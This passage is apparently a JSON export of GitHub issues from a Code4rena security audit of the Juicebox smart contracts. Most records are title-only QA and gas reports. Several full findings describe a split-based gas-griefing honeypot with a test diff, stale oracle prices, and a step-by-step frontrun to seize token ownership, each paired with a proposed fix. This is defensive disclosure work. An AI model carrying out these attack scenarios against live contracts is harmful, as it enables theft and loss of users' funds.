```     "}, {"title": "Duplicated locked splits can be discarded", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/219", "labels": ["bug", "documentation", "2 (Med Risk)", "disagree with severity", "sponsor acknowledged", "old-submission-method", "valid"], "target": "2022-07-juicebox-findings", "body": "Duplicated locked splits can be discarded"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/217", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/215", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/214", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/211", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/209", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/208", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/206", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/205", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/197", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/192", "labels": ["bug", "G (Gas Optimization)", "old-submission-method", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/191", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/189", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/188", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/186", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/185", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/183", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/182", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/181", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/173", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/172", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Juicebox project owner can create a honeypot to cause grief", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/170", "labels": ["bug", "documentation", "2 (Med Risk)", "disagree with severity", "sponsor confirmed", "valid"], "target": "2022-07-juicebox-findings", "body": "# Lines of code  https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBController.sol#L760 https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBSplitsStore.sol#L147   # Vulnerability details  ## Impact In a Juicebox project the project owner (or anyone that they approve) can set splits. These splits are details of the token distributions to other addresses in response to contributions to the project.  At the moment the `SPLITS_TOTAL_PERCENT = 1_000_000_000`. This means that the project owner could theoretically add 1 billion different splits, each with a percent value of 1. Of course, this would require too much gas, but the idea stands. A project owner could honeypot users by creating a project with the `MAX_RESERVED_RATE` reserved rate, and setting a large percentage split for the `msg.sender` who calls `distributeReservedTokensOf` in `JBController.sol`. The project owner could then fund the project with a series of large payments to ensure that the reserved amount was sufficiently large to entice a user to call `distributeReservedTokensOf` in the belief that they will be obtaining a large percentage of the reserve.  However, when a user calls this method they will hit the block gas limit and will have spent a large amount of ETH on gas, without receiving any of their expected split.  I consider this to be of high severity since user assets (in the form of gas) can be permanently lost without any loss to the project owner/griefer.  ## Proof of Concept The key behaviour we need to prove is that it's possible to set more splits before hitting the block gas limit than it is to distribute reward tokens over the same number of splits. If this is true, the project owner will be able to set a number of splits that will always make the `distributeReservedTokensOf` hit the block gas limit, and hence grief the caller.  This can be demonstrated by modifying the existing test cases. From some basic testing I have found that calling `distributeReservedTokensOf` hits the block gas limit when there are at least 389 splits, but for the same split count the project owner can successfully call `set` without hitting the block gas limit.  ``` diff --git a/test/jb_controller/distribute_reserved_token_of.test.js b/test/jb_controller/distribute_reserved _token_of.test.js index 2f964d8..6cfd645 100644 --- a/test/jb_controller/distribute_reserved_token_of.test.js +++ b/test/jb_controller/distribute_reserved_token_of.test.js @@ -119,10 +119,15 @@ describe('JBController::distributeReservedTokensOf(...)', function () {      const { addrs, projectOwner, jbController, mockJbTokenStore, mockSplitsStore, timestamp } =        await setup();      const caller = addrs[0]; -    const splitsBeneficiariesAddresses = [addrs[1], addrs[2]].map((signer) => signer.address); +    let addressList = [addrs[1], addrs[2]]; +    for (let i = 1; i < 389; i++) { +      addressList.push(addrs[1]); +    } + +    const splitsBeneficiariesAddresses = addressList.map((signer) => signer.address);       const splits = makeSplits({ -      count: 2, +      count: 389,        beneficiary: splitsBeneficiariesAddresses,        preferClaimed: true,      }); diff --git a/test/jb_splits_store/set.test.js b/test/jb_splits_store/set.test.js index 3dd0331..5992957 100644 --- a/test/jb_splits_store/set.test.js +++ b/test/jb_splits_store/set.test.js @@ -54,7 +54,7 @@ describe('JBSplitsStore::set(...)', function () {      };    }  -  function makeSplits(beneficiaryAddress, count = 4) { +  function makeSplits(beneficiaryAddress, count = 389) {      let splits = [];      for (let i = 0; i < count; i++) {        splits.push({ ```  ## Tools Used VSCode & Hardhat  ## Recommended Mitigation Steps For `JBSplit` objects there should be a minimum percentage for each split when calling `set`. Furthermore, it would probably be wise to prevent duplicate beneficiaries, but I have omitted that in the below recommendation for clarity. Below is a suggested diff. I've arbitrarily set a minimum percentage of 10,000 but given the PoC the min percentage should be conservatively set to ensure no more than 389 splits can be created (I would probably suggest a cap of max 100 splits per group).  ``` diff --git a/contracts/JBSplitsStore.sol b/contracts/JBSplitsStore.sol index d61cca2..429d78a 100644 --- a/contracts/JBSplitsStore.sol +++ b/contracts/JBSplitsStore.sol @@ -227,8 +227,8 @@ contract JBSplitsStore is IJBSplitsStore, JBOperatable {      uint256 _percentTotal = 0;       for (uint256 _i = 0; _i < _splits.length; _i++) { -      // The percent should be greater than 0. -      if (_splits[_i].percent == 0) revert INVALID_SPLIT_PERCENT(); +      // The percent should be greater than or equal to 10000. +      if (_splits[_i].percent < JBConstants.MIN_SPLIT_PERCENT) revert INVALID_SPLIT_PERCENT();         // ProjectId should be within a uint56        if (_splits[_i].projectId > type(uint56).max) revert INVALID_PROJECT_ID(); diff --git a/contracts/libraries/JBConstants.sol b/contracts/libraries/JBConstants.sol index 9a418f2..afb5f23 100644 --- a/contracts/libraries/JBConstants.sol +++ b/contracts/libraries/JBConstants.sol @@ -10,6 +10,7 @@ library JBConstants {    uint256 public constant MAX_REDEMPTION_RATE = 10000;    uint256 public constant MAX_DISCOUNT_RATE = 1000000000;    uint256 public constant SPLITS_TOTAL_PERCENT = 1000000000; +  uint256 public constant MIN_SPLIT_PERCENT = 10000;    uint256 public constant MAX_FEE = 1000000000;    uint256 public constant MAX_FEE_DISCOUNT = 1000000000;  } ```  An alternative to setting a minimum percentage would be to have a check on the length of the splits array and capping that at a sensible value. In this instance a project owner could still set low percentages per split, however I don't personally see the value in being able to set a value of 1 (to receive 1 billionth of the reserve).    "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/168", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/167", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/164", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/163", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/162", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/161", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/154", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/153", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/151", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/143", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/142", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/141", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/140", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/139", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "ORACLE DATA FEED CAN BE OUTDATED YET USED ANYWAYS WHICH WILL IMPACT ON PAYMENT LOGIC", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/138", "labels": ["bug", "3 (High Risk)", "disagree with severity", "sponsor confirmed", "valid"], "target": "2022-07-juicebox-findings", "body": "# Lines of code  https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBChainlinkV3PriceFeed.sol#L44 https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBPrices.sol#L57 https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBSingleTokenPaymentTerminalStore.sol#L387 https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBSingleTokenPaymentTerminalStore.sol#L585 https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBSingleTokenPaymentTerminalStore.sol#L661 https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBSingleTokenPaymentTerminalStore.sol#L830 https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBSingleTokenPaymentTerminalStore.sol#L868   # Vulnerability details  ## Impact The current implementation of `JBChainlinkV3PriceFeed` is used by the protocol to showcase how the feed will be retrieved via Chainlink Data Feeds. The feed is used to retrieve the `currentPrice`, which is also used afterwards by `JBPrices.priceFor()`, then by `JBSingleTokenPaymentTerminalStore.recordPaymentFrom()`, `JBSingleTokenPaymentTerminalStore.recordDistributionFor`, `JBSingleTokenPaymentTerminalStore.recordUsedAllowanceOf`, `JBSingleTokenPaymentTerminalStore._overflowDuring` and `JBSingleTokenPaymentTerminalStore._currentTotalOverflowOf`. Although the current feeds are calculated by a non implemented IJBPriceFeed, if the implementation of the price feed is the same as the showcased in`JBChainlinkV3PriceFeed`, the retrieved data can be outdated or out of bounds.  It is important to remember that the sponsor said on the dedicated Discord Channel that also oracle pricing and data retrieval is inside the scope.   ## Proof of Concept Chainlink classifies their data feeds into four different groups regarding how reliable is each source thus, how risky they are. The groups are _Verified Feeds, Monitored Feeds, Custom Feeds and Specialized Feeds_ (they can be seen [here](https://docs.chain.link/docs/selecting-data-feeds/#data-feed-categories)). The risk is the lowest on the first one and highest on the last one.  A strong reliance on the price feeds has to be also monitored as recommended on the [Risk Mitigation section](https://docs.chain.link/docs/selecting-data-feeds/#risk-mitigation). There are several reasons why a data feed may fail such as unforeseen market events, volatile market conditions, degraded performance of infrastructure, chains, or networks, upstream data providers outage, malicious activities from third parties among others.  Chainlink recommends using their data feeds along with some controls to prevent mismatches with the retrieved data. Along some recommendations, the feed can include circuit breakers (for extreme price events), contract update delays (to ensure that the injected data into the protocol is fresh enough), manual kill-switches (to cease connection in case of found bug or vulnerability in an upstream contract), monitoring (control the deviation of the data) and soak testing (of the price feeds).  The `feed.lastRoundData()` interface parameters [according to Chainlink](https://docs.chain.link/docs/price-feeds-api-reference/) are the following:      function latestRoundData() external view         returns (             uint80 roundId,             //  The round ID.             int256 answer,              //  The price.             uint256 startedAt,          //  Timestamp of when the round started.             uint256 updatedAt,          //  Timestamp of when the round was updated.             uint80 answeredInRound      //  The round ID of the round in which the answer was computed.         )  Regarding Juicebox itself, only the `answer` is used on the `JBChainlinkV3PriceFeed.currentPrice()` implementation. The retrieved price of the `priceFeed` can be outdated and used anyways as a valid data because no timestamp tolerance of the update source time is checked while storing the return parameters of `feed.latestRoundData()` inside `JBChainlinkV3PriceFeed.currentPrice()` as recommended by Chainlink in [here](https://docs.chain.link/docs/using-chainlink-reference-contracts/#check-the-timestamp-of-the-latest-answer). The usage of outdated data can impact on how the Payment terminals work regarding pricing calculation and value measurement.  Precisely the following protocol logic within `JBSingleTokenPaymentTerminalStore\u200b\u200c` will work unexpectedly regarding value management.  - `recordPaymentFrom()`:    This function handles the minting of a project tokens according to a data source if one is given. If the retrieved value of the oracle is outdated, the `_weightRatio` at [Line 387](https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBSingleTokenPaymentTerminalStore.sol#L387) will return an incorrect value and then the `tokenCount` calculated amount will suffer from this mismatch, impacting in the amount of tokens minted.  - `recordDistributionFor()`:    Performs the recording of recently distributed funds for a project. On [line 580](https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBSingleTokenPaymentTerminalStore.sol#L580) the `distributedAmount` is computed and if the boolean check is false, then the call will perform a call to `priceFor` at [line 585](https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBSingleTokenPaymentTerminalStore.sol#L585). If the returned oracle value is not adjusted with current market prices, the `distributedAmount` will also drag that error computing an incorrect `distributedAmount`. Afterwards, because the `distributedAmount` is also used to update the token balances of the `msg.sender` ([line 598](https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBSingleTokenPaymentTerminalStore.sol#L598)) it means that the mismatch impacts on the modified balance.  - `recordUsedAllowanceOf()`:    Keeps record of used allowances of a project. It returns are analogue to the ones shown at `recordDistributionFor` where the `usedAmount` resembles the `distributedAmount`. The `usedAmount` is also used to update the project's balance. If the data of the oracle is outdated, the `usedAmount` will be calculated dragging that error.  - `_overflowDuring()`:    Used to get the amount that is overflowing relative to a specified cycle. The data retrieved from the oracle is used to calculate the value of `_distributionLimitRemaining` on [line 827](https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBSingleTokenPaymentTerminalStore.sol#L827) which is used later to calculate the return value if the boolean check performed at line 834 is true. Because the return of this function is the current balance of a project minus the amount that can be still distributed, if the amount that can still be distributed is wrong so will be the subtraction thus the return value.  - `_currentTotalOverflowOf()`:    Similar to the latter but used to get the overflow of all the terminals of a project. If the retrieved data has a mismatch with the market, the `_totalOverflow18Decimal` calculated on [line 866](https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBSingleTokenPaymentTerminalStore.sol#L827) if the boolean check is false will drag this mismatch which will also be dragged into the final return of the function.  The issues of those miscalculations impact on every project currently minted, which also affects subsequently on each user that has tokens of a project resulting in a high reach impact.   ## Recommended Mitigation Steps  As Chainlink [recommends](https://docs.chain.link/docs/using-chainlink-reference-contracts/#check-the-timestamp-of-the-latest-answer):  > Your application should track the `latestTimestamp` variable or use the `updatedAt` value from the `latestRoundData()` function to make sure that the latest answer is recent enough for your application to use it. If your application detects that the reported answer is not updated within the heartbeat or within time limits that you determine are acceptable for your application, pause operation or switch to an alternate operation mode while identifying the cause of the delay.  > During periods of low volatility, the heartbeat triggers updates to the latest answer. Some heartbeats are configured to last several hours, so your application should check the timestamp and verify that the latest answer is recent enough for your application.  It is recommended both to add also a tolerance that compares the `updatedAt` return timestamp from `latestRoundData()` with the current block timestamp and ensure that the `priceFeed` is being updated with the required frequency.  If the `ETH/USD` is the only one that is needed to retrieve, because it is the most popular and available pair it can also be useful to add other oracle to get the price feed (such as Uniswap's). This can be used as a redundancy in the case of having one oracle that returns outdated values (what is outdated and what is up to date can be determined by a tolerance as mentioned).  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/136", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/135", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/134", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/126", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/125", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/123", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/122", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/121", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/119", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/116", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/115", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/114", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/112", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/110", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/108", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/107", "labels": ["bug", "G (Gas Optimization)", "old-submission-method", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Token Change Can Be Frontrun, Blocking Token", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/104", "labels": ["bug", "documentation", "3 (High Risk)", "sponsor confirmed", "old-submission-method", "valid"], "target": "2022-07-juicebox-findings", "body": "# Lines of code  https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBTokenStore.sol#L246 https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBTokenStore.sol#L266 https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBController.sol#L605   # Vulnerability details  ## Impact This vulnerability allows malicious actors to block other users from changing tokens of their projects. Furthermore if ownership over the token contract is transferred to the `JBTokenStore` contract prior to the change, as suggested in the [recourse section of Juicebox's 24.05.2022 post-mortem update](https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/main/security/postmortem/5.24.2022.md#Recourse), this vulnerability would allow an attacker to become the owner of tokens being transferred. For `JBToken` based tokens this would allow an attacker to begin issuing arbitrary amounts the token that was meant to be transferred.  ## Proof of Concept **Exploit scenario:** 1. Wanting to assign their token to their JB project an unsuspecting owner / admin transfers ownership to a `JBTokenStore` contract, either directly by calling `transferOwnership` on the token or indirectly by calling the `changeFor` method on an older `JBTokenStore` contract with `_newOwner` set as the new `JBTokenStore` contract. (For the newer Juicebox contracts the `JBController` contract's `changeTokenOf` method would be called)  2. Seeing this change an attacker submits a `changeTokenFor` calling transaction to the new `JBController` contract, triggering the `JBTokenStore` contract's `changeFor` method, linking it to one of the attacker's projects (this could be created in advance or as part of the same transaction via an attack contract) 3. The attacker can then gain ownership over the token by calling `changeTokenFor` again with the `_newOwner` set to the attacker's address 4. Assuming the token has an owner restricted `mint` method like `JBToken` based tokens the attacker can now mint an arbitrary amount of the token  ## Tools Used Manual review.  ## Recommended Mitigation Steps Before allowing a caller to change to a specific token ensure that they have control over it. This can be achieved by storing a list of trusted older JB directories and projects which are then queried. Alternatively the contract could require the caller to actually be the `.owner()`  address of the token to migrate, this would require admins to: 1. Call `changeTokenOf` with themselves as the new owner 2. Call the new change token method on the newer contract, since they are the owner they'd pass the check 3. Independently transfer the ownership to the new token store to ensure that it can issue tokens  Future migrations can be made more seamless by having older contracts directly call new contracts via a sub-call, removing a necessary transaction for the admin. The newer contracts needs to verify that the older contract is the owner address of the token that's being set and also has approval of the project owner which is being configured.   "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/94", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/93", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/86", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "JBToken: mint function could mint arbitrary amount of tokens", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/84", "labels": ["bug", "documentation", "2 (Med Risk)", "sponsor acknowledged", "valid"], "target": "2022-07-juicebox-findings", "body": "JBToken: mint function could mint arbitrary amount of tokens"}, {"title": "changeTokenOf makes it impossible for holders of oldToken to redeem the overflowed assets.", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/83", "labels": ["bug", "documentation", "2 (Med Risk)", "sponsor confirmed", "valid"], "target": "2022-07-juicebox-findings", "body": "# Lines of code  https://github.com/jbx-protocol/juice-contracts-v2-code4rena//blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBController.sol#L588-L606   # Vulnerability details  ## Impact When the owner calls the changeTokenOf function of the JBController contract, the token corresponding to the current project will be changed, which will make the oldToken holder unable to redeem the overflowing assets. ## Proof of Concept https://github.com/jbx-protocol/juice-contracts-v2-code4rena//blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBController.sol#L588-L606 https://github.com/jbx-protocol/juice-contracts-v2-code4rena//blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBTokenStore.sol#L236-L269 ## Tools Used None ## Recommended Mitigation Steps Consider adding a delay to changeTokenOf, or adding a function to convert oldToken to newToken  "}, {"title": "addFeedFor should check if inverse feed already exists", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/79", "labels": ["bug", "documentation", "2 (Med Risk)", "sponsor confirmed", "valid"], "target": "2022-07-juicebox-findings", "body": "# Lines of code  https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/JBPrices.sol#L109-L122   # Vulnerability details  ## Impact Potentially inconsistent currency conversions  ## Proof of Concept addFeedFor requires that a price feed for the _currency _base doesn't exist when adding a new price feed but doesn't check if the inverse already exists. This means that two different oracles (potentially with different prices) could be used for _currency -> _base vs. _base -> _currency. Different prices would lead to inconsistent between conversion ratios depending on the direction of the conversion  ## Tools Used  ## Recommended Mitigation Steps Change L115 to: if (feedFor[_currency][_base] != IJBPriceFeed(address(0)) || feedFor[_base][_currency] != IJBPriceFeed(address(0))) revert PRICE_FEED_ALREADY_EXISTS()  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/77", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/76", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/75", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/72", "labels": ["bug", "QA (Quality Assurance)", "valid"], 